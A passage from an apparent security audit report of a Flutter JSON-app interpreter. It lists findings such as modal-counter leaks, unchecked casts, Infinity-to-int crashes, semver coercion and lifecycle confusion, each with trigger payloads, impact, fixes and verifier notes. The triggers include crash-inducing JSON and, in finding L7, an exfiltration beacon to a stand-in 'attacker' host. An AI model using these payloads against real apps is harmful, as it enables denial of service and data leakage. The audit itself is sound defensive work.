Parent JSON-App: a button calls @show_bottom_sheet({content: {...}}) — interpreter.dart:3506. This renders arbitrary JSON content via buildWidget (3535) and increments _activeModalCount to 1 (3519); the showModalBottomSheet await stays pending in the try. The sheet content includes a button whose action is @launch_app({kind:"local", fileName:"child"}) (launcher_bridges.dart:50/215). _launchApp calls interpreter.pushState() (launcher_bridges.dart:311), which executes interpreter.dart:659 `_activeModalCount = 0` WITHOUT storing the prior value (1) into the snapshot. The child app loads and its route is pushed; when the child route pops, .whenComplete calls popState() (launcher_bridges.dart:339 → interpreter.dart:665-713) which restores controllers/IM/nav/params/config but NEVER restores _activeModalCount (no field in _InterpreterStateSnapshot, interpreter.dart:4030-4060). Back in the parent, the user dismisses the still-open bottom sheet; its finally runs `_activeModalCount--` (interpreter.dart:3543) taking the count to -1. dismissAllModals() (interpreter.dart:110-119) now hits `if (_activeModalCount <= 0) return` and permanently no-ops for the rest of the parent session, so any later back/exit path that relies on it silently leaves stray modal routes. NOTE: the finding's cited trigger via @show_dialog/_showAlertDialog is inaccurate — alert/choice/text dialogs (3286-3404) have hardcoded buttons that cannot fire @launch_app; the reachable path is @show_bottom_sheet, whose content is attacker-controlled JSON rendered through buildWidget.
```

**影响**：Leaked/undismissable modal routes across app boundaries, negative counter permanently disabling dismissAllModals for the parent session; dialogs from a dead child can float over the parent.

**修复建议**：Add activeModalCount to _InterpreterStateSnapshot; save it in pushState() before zeroing and restore it in popState(). Clamp _activeModalCount at 0 in the dialog finally blocks.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and verified against the actual code. interpreter.dart:659 sets _activeModalCount = 0 inside pushState() but does not snapshot the prior value; _InterpreterStateSnapshot (4030-4060) has no activeModalCount field; popState (665-713) restores every other piece of state but leaves _activeModalCount untouched. The four dialog/sheet helpers (3290, 3329, 3391, 3519) all `++` before await and `--` in finally with no clamp, so a decrement after the count was externally zeroed produces -1. dismissAllModals (110-119) is guarded by `if (_activeModalCount <= 0) return`, so a negative count permanently disables modal cleanup for the parent session. The trigger is reachable from untruste。…

</details>

---

#### `M24` — @cell.set crashes on non-numeric cell elements (unchecked `as num` cast)

**类别**：类型/崩溃 · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_actions.dart:416-417`

**机制**：@cell.set validates only that cell is a List of length 2, then does `(cell[0] as num).toInt()` / `(cell[1] as num).toInt()`. If an element is a String or other non-num, the cast throws CastError. Neither runAction nor runStep nor GameLogicEngine.runLogic nor the Flame update() loop wraps dispatch in a try/catch (only _evalJsonLogic does), so a direct {call} step propagates the exception out of the frame, crashing the game tick.

**触发用例**：

```
In a flame_game JSON App that registers a CellEntity with id "player", set any input/frame action to: { "call": "@cell.set", "args": { "id": "player", "cell": ["a", "b"] } }. On the next tap (or frame, if placed in frame logic), _resolveMap keeps the strings, the List-length-2 check passes, and `("a" as num).toInt()` throws an unhandled CastError that escapes runLogic's try/finally into the Flame tick / gesture callback.
```

**影响**：Malformed-but-legal JSON crashes the game loop, violating the Framework Stability Principle (framework must tolerate any legal JSON).

**修复建议**：Use _asInt() (which is already defined and returns null on bad input) and return null when either coordinate is non-numeric instead of casting.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and reachable. At /home/fish/ai-app/lib/games/game_actions.dart:413-417, @cell.set validates only `cell is! List || cell.length != 2`, then does `(cell[0] as num).toInt()` / `(cell[1] as num).toInt()`. A non-numeric element (e.g. a String) makes `as num` throw a CastError.

I traced the full untrusted-input path and confirmed no guard neutralizes it:
- args reach dispatch via _resolveMap (game_logic.dart:107,256-262), which calls resolveExpression on each value. For a literal list `["a","b"]`, resolveExpression (game_logic.dart:216-217) maps each element; each is a plain String with no `{{`, so _resolveString returns it unchanged (game_logic.dart:239). So args['cell'] i。…

</details>

---

#### `M25` — @animated_sprite.effect crashes on non-numeric position elements (unchecked `as num` cast)

**类别**：类型/崩溃 · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_actions.dart:1476-1478`

**机制**：_spawnAnimationEffect checks only `pos is List && pos.length >= 2` then does `(pos[0] as num).toDouble()` and `(pos[1] as num).toDouble()`. A non-numeric element throws an uncaught CastError that propagates out of dispatch and crashes the frame (no surrounding try/catch in the dispatch/update path).

**触发用例**：

```
A flame_game JSON App with frame logic (runs every frame via update()): {"flame_game": {"update": [{"call": "@animated_sprite.effect", "args": {"asset": "x.png", "position": ["NaN", true]}}]}}. On the first frame, _resolveMap preserves ["NaN", true], dispatch routes to _spawnAnimationEffect, and `(pos[0] as num)` throws CastError out of update() with no catch, breaking the game loop. Equivalently triggerable via any input action (tap/swipe/pan) carrying the same call.
```

**影响**：Malformed legal JSON crashes the game loop.

**修复建议**：Use the existing _asDouble() helper and bail out (return false) when either coordinate is non-numeric.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and reachable. At /home/fish/ai-app/lib/games/game_actions.dart:1476-1478, _spawnAnimationEffect only checks `pos is List && pos.length >= 2` then performs the NON-nullable casts `(pos[0] as num).toDouble()` / `(pos[1] as num).toDouble()`. A String like "NaN" or a bool throws an uncaught CastError. (Note the contrast: every other field in the same function uses the safe nullable form `as num?` with `?.toDouble()`, which would not throw — only these two coordinate casts are unsafe, confirming it's a genuine bug, not a pattern that's caught elsewhere.)

Reachability from untrusted JSON is fully traced: (1) @animated_sprite.effect is a plain `dispatch` case (game_actions.d。…

</details>

---

#### `M26` — _toInt crashes (UnsupportedError) on Infinity/NaN produced by pow/sqrt/lerp/division

**类别**：类型/崩溃 · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:3756-3761 (def); reached via 290, 300-303, 332, 1701`

**机制**：_toInt does `if (val is double) return val.toInt();` with no isFinite guard. Dart's double.infinity.toInt() / double.nan.toInt() throw `UnsupportedError: Infinity or NaN toInt`. Untrusted JSON can trivially manufacture a non-finite double through the custom math operators: `pow` (line 364-369) returns `pow(10,1000).toDouble()` == Infinity, `lerp`/division can yield NaN, etc. That value then flows into any `_toInt` consumer — notably the `at` operator (line 290) and `slice` operator (line 300-303) which call `_toInt(applier(...))` on an index expression evaluated inside jsonlogic. The exception is thrown mid-evaluation and is not caught inside the operator, so it unwinds the whole expression/action.

**触发用例**：

```
Action: {"type":"call","call":"@to_int","args":{"value":{"pow":[10,1000]}}}. Flow: executeAction → _executeCall("@to_int") (interpreter.dart:1270 _resolveArgs, then :1701 _toInt(_evaluateExpression(...))). The jsonlogic `pow` operator (:364-368) returns pow(10,1000).toDouble() == double.infinity (numAt's isFinite guard at :219 only clamps INPUTS to math ops, not the pow OUTPUT). _toInt (:3756-3761) does `if (val is double) return val.toInt();` with no isFinite check, so double.infinity.toInt() throws UnsupportedError("Infinity or NaN toInt"). The same sink is reachable via the `at` operator (:290) and `slice` (:300-303), e.g. {"at":[{"var":"global.arr"},{"pow":[10,1000]}]}. The exception is caught by executeAction's top-level try/catch at :1115-1119 and routed to onActionCrash → crash page (matches reviewer's stated impact). Note: the reviewer's secondary "sqrt/lerp NaN" claim is weaker — sqrt is guarded by max(0,...) (:362) and numAt clamps non-finite inputs — but the pow→Infinity path is fully reliable and sufficient.
```

**影响**：A malformed/adversarial expression crashes action execution (routed to crash page) instead of being tolerated, violating the Framework Stability Principle (legal JSON / legal arithmetic must not crash the framework). Reliable client-side DoS of the running JSON App.

**修复建议**：In _toInt (and _toDouble), guard non-finite doubles: `if (val is double) return val.isFinite ? val.toInt() : 0;`. Also clamp `pow` output, e.g. return 0/NaN-safe finite value, and reject non-finite results in numAt.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified in code. _toInt at interpreter.dart:3758 has no isFinite guard (confirmed). `pow` at :364-368 returns an unclamped .toDouble(), and pow(10,1000) overflows to double.infinity per standard Dart semantics; double.infinity.toInt() throws UnsupportedError. This value reaches _toInt unguarded via @to_int (:1701) and via the `at`/`slice` jsonlogic operators (:290, :300-303). The numAt isFinite guard at :219 does NOT neutralize this because it only sanitizes inputs to the trig/pow/sqrt operators, not pow's overflowing output, and _toInt is a separate sink that bypasses numAt entirely. The executeAction try/catch at :1115-1119 does NOT neutralize the finding either — the reviewer e。…

</details>

---

#### `M27` — navigateTo permanently mutates _config['ui']['screens'] with unchecked cast → unbounded growth and type crash

**类别**：类型/崩溃 · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:1169-1191`

**机制**：For 'depName:screenId' navigation, navigateTo casts ((_config['ui'] as Map<String,dynamic>)['screens'] as List).add(...). If the app has dependency screens but no top-level 'ui' map (or ui.screens is absent / not a List), this is an unchecked cast that throws. Even on the happy path, the injected screen is appended to the live config list and never removed, so repeated navigation to dependency screens with differing ids grows _config indefinitely; and because the injected id equals 'depName:screenId', the 'exists' guard only dedupes exact repeats, not the underlying memory cost across many distinct dep screens.

**触发用例**：

```
A JSON App declares a dependency module that exports a screen (so `_depLoader.findScreen(depName, depScreenId)` returns non-null — fully attacker-controllable via the registry per the threat model), and authors its top-level config so that `ui` is absent OR `ui.screens` is a Map instead of a List (both are legal JSON the framework must tolerate). Then any action `{"type":"navigate","screen":"mylib:page1"}` reaches navigateTo (interpreter.dart:1169). Because findScreen returns non-null and the injected id does not yet exist, control reaches line 1186: `((_config['ui'] as Map<String,dynamic>)['screens'] as List).add(...)`. If `ui` is missing, `null as Map<String,dynamic>` throws TypeError; if `ui.screens` is a Map/absent, `as List` throws TypeError. The exception propagates out of navigateTo and is caught by the try/catch in executeAction (interpreter.dart:1082) / executeActionWithResult (1163), routing to onActionCrash. Result: the navigate action fails and a crash report is fired, rather than a hard process crash.
```

**影响**：App crash on malformed-but-legal config; long-lived sessions navigating to many dependency screens leak config memory.

**修复建议**：Guard the casts: read ui as Map?, screens as List?, bail out (or create the list) safely; consider injecting dependency screens into a separate ephemeral map keyed for the session rather than mutating the loaded _config, and reset it in loadConfig/pushState.

<details><summary>对抗验证者核验结论</summary>

I traced the full path. The unchecked casts at interpreter.dart:1186-1188 are real and diverge from the null-safe `screens` getter at lines 173-175 (which uses `as Map<String,dynamic>?`/`as List<dynamic>?` with a `?? []` fallback). The crash site uses non-nullable casts with no guard. The path is reachable from untrusted input: findScreen (dependency_loader.dart:249) returns non-null whenever the attacker-controlled dependency exports a matching screen, satisfying the `depScreen != null` branch; the `if (!exists)` block is entered for any not-yet-injected id; then the cast executes. Both fault shapes are legal JSON: a config with no `ui` key, or with `ui.screens` as an object, are tolerated 。…

</details>

---

#### `M28` — _parseColor crashes the rasterizer on any non-hex color string (uncaught FormatException)

**类别**：类型/崩溃 · **边界**：B · **置信度**：high · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/widgets/visual_primitives_widget.dart:2981-2987`

**机制**：_parseColor strips a leading '#' and, for 6- or 8-char remainders, calls int.parse('FF$hex', radix:16) / int.parse(hex, radix:16) with no try/catch. If the hex body contains any non-[0-9a-fA-F] character (e.g. '#gggggg', '#12 456', '#zzzzzzzz') int.parse throws FormatException. This is reached on every paint/build from dozens of attacker-controlled fields: layer['color'], 'color2', 'gridColor', 'fallbackColor', node['color'], 'backgroundColor', 'radialHighlightColor', gradient color entries (_color line 2773-2774). For painter call sites the throw happens inside CustomPainter.paint, which Flutter does NOT catch gracefully on every backend the same way build errors are — it produces a paint exception every frame, and for the build-time call sites (e.g. JsonAnimatedContainerWidget color line 78-82) it throws during widget build, breaking the whole screen.

**触发用例**：

```
{"type":"animated_container","color":"#gggggg","child":{"type":"text","text":"x"}} — a build-time call site (JsonAnimatedContainerWidget.build, line 78-82) where _parseColor throws FormatException during widget build, surfacing the red error widget / breaking the subtree. (The reviewer's animated_canvas/layers trigger instead hits the _color path inside CustomPainter.paint at line 2773; Flutter catches paint exceptions per-frame, so that path is per-frame exception spam + blank paint rather than a hard screen break — still a defect, but less severe than the build-time path.)
```

**影响**：A single malformed color string in untrusted JSON throws a FormatException, breaking the affected widget (build-time call sites take down the whole screen render); contradicts the Framework Stability Principle that any legal JSON must be tolerated.

**修复建议**：Wrap the int.parse calls in try/catch (or use int.tryParse) and return null on failure; also validate hex length is exactly 6 or 8 and characters are hex before parsing.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified at lib/json_ui/widgets/visual_primitives_widget.dart:2981-2987. _parseColor strips '#', checks hex.length == 6 or 8, then calls int.parse('FF$hex', radix:16) / int.parse(hex, radix:16) with NO try/catch and NO validation that the characters are actually hex digits. In Dart, int.parse(s, radix:16) throws FormatException on non-hex input (only int.tryParse returns null), so '#gggggg' (6 chars) and '#zzzzzzzz' (8 chars) pass the length gate and throw. I traced the entire build path (interpreter.buildWidget:3704 -> JsonWidgetBuilder.build:192-194 -> builder.build) and found NO try/catch anywhere — the reviewer did not miss a guard. There are 8 reachable call sites, all fed by 。…

</details>

---

### 低危 (Low)

#### `L1` — Documented JsonLogic op set (JSON-DSL.md §3.3) is a stale subset of _knownJsonLogicOps → data Maps using undocumented op keys are silently evaluated as expressions

**类别**：契约不一致 · **边界**：design · **置信度**：high · **原始/校准严重度**：medium → low  
**位置**：`lib/json_ui/interpreter.dart:516-534 (_knownJsonLogicOps) vs JSON-DSL.md lines 240-241`

**机制**：The contract lists the op set an author must avoid as data-Map keys, but the doc list omits many ops that the code actually treats as jsonlogic: '%', 'method', 'missing', 'missing_some', '?:', '===', '!==', 'min','max','reduce','all','some','none', and the entire math family 'sin','cos','tan','atan2','sqrt','pow','clamp','lerp','seed','pi'. Per §3.3 a single-key data Map whose key collides with an op is sent to jsonlogic and 'goes to crash'. An author who consults the doc would believe keys like {"pow": ...}, {"min": ...}, {"method": ...}, {"seed": ...} are safe data keys; they are not.

**触发用例**：

```
The ONLY genuinely-drifted keys are: `method`, the math family (`sin`,`cos`,`tan`,`atan2`,`sqrt`,`pow`,`clamp`,`lerp`,`seed`,`pi`), and `str_replace_first` — these appear in _knownJsonLogicOps (interpreter.dart:516-534) but NOT in JSON-DSL.md:240-241. The reviewer's claimed omissions `%`, `missing`, `missing_some`, `?:`, `===`, `!==`, `min`, `max`, `reduce`, `all`, `some`, `none` are ALL actually present in the doc (line 240), so those parts of the finding are wrong. The reviewer's first trigger `{"min": 3}` is INVALID — `min` is documented, so an author following the doc would correctly avoid it. The only working trigger is a single-key data Map keyed on a truly-undocumented op, e.g. `@set value = {"method": "card"}` or `@list_add args.item = {"seed": 42}` (single key, key in _knownJsonLogicOps but absent from doc) → _looksLikeJsonLogic returns true at interpreter.dart:493 → _jl.apply runs at line 467 → JsonlogicException or wrong result. Note: real templates use `"method"` only inside multi-key HTTP-args Maps (interpreter.dart:3046), which do NOT trigger because _looksLikeJsonLogic requires `m.length == 1`.
```

**影响**：Legal JSON data Maps with these (undocumented-as-reserved) single keys are mis-evaluated or crash the framework, violating the Framework Stability Principle. The two reserved-word lists must be kept in sync but currently are not.

**修复建议**：Regenerate the doc op list from _knownJsonLogicOps (single source of truth), or add a test asserting the two sets match. Better: stop treating user data Maps as expressions by requiring an explicit expression wrapper (e.g. {"$expr": {...}}) so no key name is ever reserved.

<details><summary>对抗验证者核验结论</summary>

The underlying contract-mismatch is REAL and reachable: JSON-DSL.md:240-241 is a stale subset of _knownJsonLogicOps (interpreter.dart:516-534), and the maintainer comment at lines 513-515 explicitly acknowledges these two lists must be kept in sync. A single-key data Map keyed on a drifted op name reaches _jl.apply via _looksLikeJsonLogic (line 493) → _evaluateExpression (line 465-467) and crashes/misbehaves — the exact failure mode §3.3 (doc lines 237/243) claims was tamed. So I cannot fully refute it.

However the finding is substantially miscalibrated and mostly inaccurate on specifics: the reviewer asserts the doc omits `%`, `missing`, `missing_some`, `?:`, `===`, `!==`, `min`, `max`, `r。…

</details>

---

#### `L2` — AssetCache in-memory map eviction is FIFO-on-first-key and can evict in-use entries; memory cache key collisions across namespaces are mitigated but disk extension is attacker-influenced

**类别**：设计缺陷 · **边界**：D · **置信度**：medium  
**位置**：`lib/json_ui/asset_cache.dart:128-154`

**机制**：_extension derives the on-disk file suffix from the untrusted URL path's trailing '.xxx' (line 128-135). It guards length>12 and contains('/') → '.bin', and the filename body is a sha256 of the URL, and the namespace segment is hashed via _safeSegment, so traversal is well-contained — this part is sound. The weaker point is _remember (line 150-154): when the memory cache exceeds 256 entries it evicts _memory.keys.first (insertion order), which is a crude FIFO, not LRU; under an app that streams many distinct asset URLs this constantly evicts and re-downloads recently used assets (re-fetch amplification) but never bounds disk cache at all (writeBytesAbs has no cap). So the disk asset cache grows unboundedly per namespace with no eviction.

**触发用例**：

```
A JSON App referencing thousands of distinct image/asset URLs (e.g. a list bound to attacker data generating unique URLs). Each unique URL is downloaded and persisted to disk under json_app_assets/<ns>/files/<sha256><ext> with no size or count limit; the 256-entry memory cap only affects RAM and causes thrashing/re-download.
```

**影响**：Unbounded disk growth for asset cache (device DoS) and download amplification due to non-LRU memory eviction. Lower severity than the dependency cache issues; the path construction itself is safe.

**修复建议**：Add a disk-side size/age cap with eviction for json_app_assets; replace FIFO memory eviction with LRU; consider an explicit per-namespace asset budget.

<details><summary>对抗验证者核验结论</summary>

Read /home/fish/ai-app/lib/json_ui/asset_cache.dart in full and traced its callers. Both substantive claims are accurate and reachable from untrusted JSON; no neutralizing guard was missed.

(1) FIFO memory eviction — confirmed at lines 150-154. `_remember` evicts `_memory.keys.first`, which is Dart Map insertion order, i.e. FIFO not LRU. On a memory hit (lines 79-82) it returns directly without re-inserting/promoting the key, so a hot asset is NOT protected from eviction. With >256 distinct URLs in one namespace this thrashes. This sub-claim is real but minor — the cost is self-inflicted re-download bandwidth within one app session.

(2) Unbounded disk cache — confirmed. Line 107 calls Nati。…

</details>

---

#### `L3` — Game logic engine swallows all jsonlogic evaluation errors, hiding type/logic faults

**类别**：设计缺陷 · **边界**：design · **置信度**：medium  
**位置**：`lib/games/game_logic.dart:318-329`

**机制**：_evalJsonLogic wraps apply() in a bare `catch (e) { return null; }` with no logging. Inline actions embedded in jsonlogic operands are executed during _resolveJsonLogicOperands (line 342-344) for side effects; if such an inline @action throws or jsonlogic misbehaves, the whole expression silently becomes null. Combined with @cell.set/@animated_sprite.effect casts being uncaught elsewhere, error handling is inconsistent: some paths crash the frame, others silently null out, making malformed-input behavior unpredictable and masking logic bombs.

**触发用例**：

```
Register a CellEntity (e.g. id "tile" via the entities spec), then run an inline @cell.set inside a jsonlogic operand whose cell coords are non-numeric so the `(cell[0] as num)` cast at game_actions.dart:416 throws: {"call": "@if", "args": {"cond": {"and": [{"call": "@cell.set", "args": {"id": "tile", "cell": ["a", "b"]}}, true]}, "then": [...]}}. The cast throw bubbles into _evalJsonLogic, is swallowed by the catch at game_logic.dart:325-328, and `cond` silently resolves to null/falsey — the `then` branch never runs and no error is logged. Contrast: the identical {"call": "@cell.set", "args": {"id": "tile", "cell": ["a","b"]}} placed directly in a frame-logic step throws uncaught out of runLogic (flame_game_engine.dart:174) and crashes the frame, demonstrating the inconsistent semantics.
```

**影响**：Inconsistent, silent failure semantics; obscures real faults and makes contract behavior ambiguous.

**修复建议**：Log (debugPrint) the swallowed expression error with the offending rule, and make malformed-input handling consistent across all action paths (return null gracefully rather than throwing) so behavior is predictable.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and accurately cited. game_logic.dart:318-329 _evalJsonLogic wraps _jsonlogic.apply() in a bare `catch (e) { return null; }` with no debugPrint/logging. Operand pre-resolution at 342-344 (_resolveJsonLogicOperands) executes inline `{"call": "@..."}` actions for side effects during expression evaluation, so any throw from an inline action is swallowed and the whole expression silently resolves to null. The claimed inconsistency is also confirmed: frame logic is invoked at flame_game_engine.dart:174 (`logic.runLogic(_frameLogic!, {'dt': dt})`) and the tick loop at :186 with NO surrounding try-catch, and runAction/runStep (game_logic.dart:61-118) does not catch action throws. 。…

</details>

---

#### `L4` — Startup steps exception rethrows from executeSteps but error-handling design can leave nested apps with a half-loaded state

**类别**：设计缺陷 · **边界**：design · **置信度**：medium  
**位置**：`lib/json_ui/interpreter.dart:724-745 (executeSteps), 2805-2818 (@apply_app_config swallows), lifecycle _runStepList 3882-3892 (swallows)`

**机制**：Error routing is inconsistent across the three step-execution entry points. executeSteps rethrows after onActionCrash (good — caller can avoid pushing the screen). But @apply_app_config catches the same executeSteps and returns false, having already mutated _config/_variables via loadConfig — leaving the running app pointed at a partially-initialized new config with no crash page and no rollback. Lifecycle hooks (_runStepList) swallow per-step errors silently. There is no single documented onRuntimeError contract; behavior depends on which path threw.

**触发用例**：

```
A JSON App calls the built-in `@apply_app_config` with `{ "config": { ... } }` where the new config's `global.variables` is replaced and its first `steps[]` entry throws (e.g. an `@http_request` to an unreachable host with a downstream cast, or any step that raises). Code path: interpreter.dart:2810 `loadConfig(newConfig)` unconditionally replaces `_config`, `_variables`, `_functions`, clears `_loopContextStack`/`_paramsStack`/`_navigationHistory`/`_depLoader`, disposes `_textControllers`/`_focusNodes`, cancels the IM inbox sub (lines 563-612) — all BEFORE `await executeSteps()` at 2812. When executeSteps throws (rethrown at 743 after onActionCrash), the catch at 2815-2817 only `debugPrint`s and returns false. No rollback. The running app is now pointed at the new, only-partially-initialized config, and unlike the loadConfig-from-startup path (executeSteps rethrows so the caller avoids pushing JsonScreenView), here notifyListeners was skipped but state is already mutated and subsequent rebuilds render the broken config without a crash page.
```

**影响**：Inconsistent recovery: some failures show the AI-fix crash page, others silently leave a corrupted runtime. Makes 'an exception in startup bricks vs is swallowed' unpredictable.

**修复建议**：Make @apply_app_config snapshot state before loadConfig and roll back (or route to onActionCrash and not swallow) on executeSteps failure; define one onRuntimeError policy and apply it uniformly across executeSteps / action callbacks / lifecycle hooks.

<details><summary>对抗验证者核验结论</summary>

I read all three cited code regions and they match the reviewer's description precisely. (1) Mechanism is real: loadConfig (interpreter.dart:563-612) mutates _config/_variables/_functions and clears/disposes all state with zero precondition, and runs strictly before executeSteps() inside @apply_app_config (2808-2818). The catch block at 2815-2817 swallows (debugPrint + return false) with no rollback. (2) No missed guard: a snapshot machinery does exist in this file (pushState/popState, documented at 614+ as restoreFromSnapshot used at 696-712), but @apply_app_config deliberately does NOT use it — it calls loadConfig directly, so there is no rollback or onActionCrash routing on this path. (3)。…

</details>

---

#### `L5` — Nested @launch_app causes cross-app lifecycle hook confusion: parent onPause/onResume never fire while suspended, and the singleton listener silently switches to whichever _config is live

**类别**：设计缺陷 · **边界**：E · **置信度**：high · **原始/校准严重度**：medium → low  
**位置**：`lib/json_ui/interpreter.dart:3856-3873 (listener reads live _config), 624-660 (pushState does not detach), 704 (popState swaps _config back), 311-313 (launcher pushState→loadConfig)`

**机制**：The lifecycle listener is a single closure stored on the interpreter singleton (_lifecycleListener, line 3854). The closure does not bind to a particular app; it reads the lifecycle hooks live from `_config['global']['lifecycle']` every time the OS fires an event (lines 3860-3866). loadConfig() always re-attaches via _attachLifecycleListener() (line 611). During a nested @launch_app, launcher_bridges.dart:311-313 calls pushState() then loadConfig(childConfig). pushState() (lines 624-660) snapshots config/variables/etc. but DOES NOT detach or suspend the lifecycle listener, and _InterpreterStateSnapshot (lines 4030-4060) has no field for the suspended app's lifecycle state. After loadConfig the live _config is the CHILD config. Consequence #1: while the parent app is logically suspended (its widget tree still mounted underneath the child route), an OS pause/resume fires only the CHILD's onPause/onResume — the parent's onPause is never invoked even though, from the parent app's perspective, the user just backgrounded it. Consequence #2: when the child route is popped, popState() (line 665) restores _config to the parent (line 704) but never touches the lifecycle listener; the same singleton closure now silently begins reading PARENT hooks again with no re-init. There is no per-app isolation: any app in the nesting chain whose config happens to be live owns the global lifecycle stream.

**触发用例**：

```
Parent app A: global.lifecycle.onPause/onResume declared. A runs @launch_app({kind:"market", name:"childB"}) which calls pushState() then loadConfig(B). While B is foreground, OS pause/resume fires only B's hooks (live _config is B). After B is popped (popState restores A's _config), the next OS resume fires A's onResume with no preceding onPause. Verified path: interpreter.dart:3858-3866 (live _config read), 624-660 (push no-detach), 611 (re-attach), 704 (pop swap), launcher_bridges.dart:311-313. Note: child cannot read/write parent variables; impact is limited to A's own lifecycle-hook pairing.
```

**影响**：Lifecycle contract violation across the app boundary: a parent app's pause/resume hooks are starved while a (untrusted) child app is on screen, and resume can fire without a paired pause. Apps relying on lifecycle hooks for state-checkpointing, token refresh, lock release, or pause-time data flushing silently lose those callbacks. A malicious or buggy child app effectively suppresses the parent's lifecycle-driven security/state logic for as long as it stays foreground. State-corruption / lifecycle-confusion across the cross-app boundary the platform is supposed to isolate.

**修复建议**：Make lifecycle state part of the push/pop stack instead of reading a single live _config. Option A: in pushState() call _detachLifecycleListener() (or stash a flag) and in popState() re-attach against the restored config, so only the foreground app's hooks fire and re-init is explicit. Option B: snapshot whether a listener was attached and fire the parent's onPause synthetically when it is suspended and onResume when it is restored, so each app sees a coherent pause→resume pairing. Minimally, bind each attached listener to a captured config reference (not the live _config field) so a stale event cannot dispatch into the wrong app's hooks.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified against the real code. The lifecycle listener is a single closure on the interpreter singleton (interpreter.dart:3854) created by _attachLifecycleListener (3856-3873). It reads hooks LIVE from _config['global']['lifecycle'] at event time (3860-3866), not from a captured config. pushState() (624-660) snapshots config/variables/IM/controllers but does NOT detach the listener and _InterpreterStateSnapshot has no lifecycle field; loadConfig always re-attaches via _attachLifecycleListener() at line 611, rebinding the closure to read whatever _config is now live (the child). popState() (665-713) restores _config at line 704 but never touches the listener. launcher_bridges.dart:3。…

</details>

---

#### `L6` — VersionConstraint operator/prefix parsing accepts garbage operands, normalizing them to 0.0.0 ranges

**类别**：设计缺陷 · **边界**：D · **置信度**：medium  
**位置**：`lib/json_ui/semver.dart:106-127`

**机制**：_parseSingleRange strips a known prefix ('>=','>','<=','<') and hands the remainder to SemVer.parse, which never fails (see SemVer.parse finding). A constraint like '>=garbage' becomes >=0.0.0 (allows everything), and an unrecognized form (e.g. '!=1.0.0' or '1.x') falls through to the exact-version branch (line 124) parsing to 0.0.0, producing an exact ==0.0.0 range that silently never matches real versions or unexpectedly matches a 0.0.0 package. Multi-part constraints split on whitespace (line 90) with no validation, so empty/garbage tokens map to permissive any/0.0.0 ranges.

**触发用例**：

```
dependencies: { "common-ui": ">=oops" } in an untrusted JSON App. VersionConstraint.parse('>=oops') (dependency_loader.dart:61) strips '>=' and calls SemVer.parse('oops') -> 0.0.0, yielding _VersionRange(min: 0.0.0, minInclusive: true) which satisfiedBy returns true for every published version, defeating the apparent lower bound. Likewise "common-ui": "1.x" becomes exact ==0.0.0 and never matches a real package.
```

**影响**：Constraint strings that look restrictive silently become permissive (or impossible), so dependency resolution does not enforce the declared intent — a boundary-D integrity weakness rather than a crash.

**修复建议**：Validate the operand of each operator and reject unknown operators/forms ('1.x','!=', empty tokens) instead of coercing to 0.0.0; propagate parse errors so the resolver can refuse the dependency.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified against /home/fish/ai-app/lib/json_ui/semver.dart:106-127 and SemVer.parse:12-20. SemVer.parse uses int.tryParse(...) ?? 0 with no failure path, so '>=oops' (or any garbage operand) parses to >=0.0.0, which _VersionRange.allows (lines 148-158) treats as a lower bound satisfied by every real version. Unrecognized forms ('1.x','!=1.0.0') fall through to the exact-version branch (line 124) and become ==0.0.0. Multi-part split on whitespace (line 90) has no token validation. No guard/validation exists; the parse is genuinely silent and coercive.

Trigger is reachable from untrusted JSON: dependency declarations flow through DependencySpec.fromJson -> VersionConstraint.parse (d。…

</details>

---

#### `L7` — Analog stick fires a full action dispatch on every onPanUpdate frame with no throttling

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：medium  
**位置**：`lib/json_ui/widgets/analog_stick_widget.dart:50-67, 91 (onPanUpdate -> update -> _runAction)`

**机制**：Every onPanUpdate gesture frame calls update(), which calls setState() (rebuilds the widget subtree) and _runAction(onChange,...), which invokes interpreter.executeActionWithEvent for the JSON-defined onChange action on every frame. The onChange action is fully attacker-controlled and can perform expensive work (HTTP via @fetch, setVariable→notifyListeners rebuilding the whole screen, nested calls). There is no rate limiting/coalescing, so a single continuous drag triggers tens of action executions per second, each potentially rebuilding the entire JSON UI tree.

**触发用例**：

```
{"type":"analog_stick","onChange":{"call":"@set","args":{"var":"global.x","value":"{{ event.x }}"}}} — every onPanUpdate frame of a continuous drag calls update() (analog_stick_widget.dart:50-67), which unconditionally calls setState() AND _runAction(onChange,...) → interpreter.executeActionWithEvent. @set → setVariable → notifyListeners() (interpreter.dart:826-840, 834) rebuilds the entire ChangeNotifier-bound JSON UI tree once per pan frame (~60/s) with no throttle, debounce, or value-changed guard. For a network beacon use a real built-in such as @http_get (interpreter.dart:1571) instead of the non-existent "@fetch" cited in the original finding: {"call":"@http_get","args":{"url":"https://attacker/log?x={{ event.x }}"}}.
```

**影响**：Frame-rate-driven amplification: one drag generates a flood of action executions / network requests / full UI rebuilds, degrading the client and enabling high-frequency exfil beacons.

**修复建议**：Throttle/coalesce onChange dispatch (e.g. emit at most once per frame via a pending-flag or a short debounce) and only fire when the normalized value actually changed, similar to how other high-frequency inputs are rate-limited.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable. analog_stick_widget.dart:91 wires onPanUpdate -> update(); update() (lines 50-67) unconditionally calls setState(() => _knob = ...) and _runAction(widget.interpreter, context, widget.spec['onChange'], {...}). _runAction (lines 147-160) forwards the attacker-controlled onChange Map to interpreter.executeActionWithEvent (interpreter.dart:1125), which runs the full action pipeline (executeAction -> _executeCall). I confirmed there is NO throttle/debounce/pending-flag and NO "value actually changed" check anywhere in the widget — the full file (178 lines) shows update() always fires on every frame. @set is a real built-in (interpreter.dart:1315) and setVariable a。…

</details>

---

#### `L8` — Dependency cache index grows unboundedly with no eviction

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high · **原始/校准严重度**：medium → low  
**位置**：`lib/json_ui/cache_manager.dart:245-267`

